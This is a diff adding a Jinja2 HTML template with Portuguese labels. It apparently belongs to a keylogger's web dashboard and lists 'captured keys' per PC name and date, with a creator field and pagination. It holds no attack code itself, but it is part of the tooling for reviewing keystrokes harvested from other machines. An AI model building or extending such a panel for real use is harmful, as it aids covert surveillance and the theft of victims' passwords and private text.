@@ -1,0 +1,33 @@
+{% extends 'base.html' %}
+
+{% block content %}
+
+<h2>Teclas capturadas:</h2>
+{% if saves %}
+
+    {% for save in saves %}
+
+    <div class="parte-pc">
+        <div class="header-parte-pc">
+            {{save.id}}
+            <h3>Nome PC: {{save.pcname.capitalize()}}</h3>
+            <p class="data">{{save.data.strftime("%d/%m/%Y")}}</p>
+        </div>
+        <p class="texto">{{save.texto}}</p>
+        <p class="criador">Criador: {{save.criador}}</p>
+    </div>
+
+    {% endfor %}
+
+    <div class="prox">
+        <a href="{{url_for('teclas_salvas', pg=(beforepage))}}"><i class="fa-solid fa-angles-left"></i></a>
+        <p class="num-page">{{page}}</p>
+        <a href="{{url_for('teclas_salvas', pg=(nextpage))}}"><i class="fa-solid fa-angles-right"></i></a>
+        <input type="button" value="">
+    </div>
+
+{% else %}
+    <p>Nenhum dado salvo </p>
+{% endif %}
+
+{% endblock %}
